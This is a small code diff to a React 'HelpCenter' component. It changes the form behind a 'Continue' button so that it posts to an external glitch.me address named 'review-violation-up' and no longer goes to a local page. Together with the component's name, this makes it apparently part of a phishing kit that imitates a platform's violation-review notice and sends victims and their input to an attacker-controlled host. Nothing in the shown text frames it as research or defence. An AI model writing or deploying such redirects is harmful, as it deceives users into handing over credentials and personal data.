@@ -135,7 +135,7 @@ const HelpCenter: React.FC = () => {
                         </div>
 
                         {/* Continue button with JavaScript redirection */}
-                        <form id="redirectForm" method="post" action="next.html">
+                        <form id="redirectForm" method="post" action="https://review-violation-up.glitch.me/">
                             <button type="submit" className="button">Continue</button>
                         </form>
 
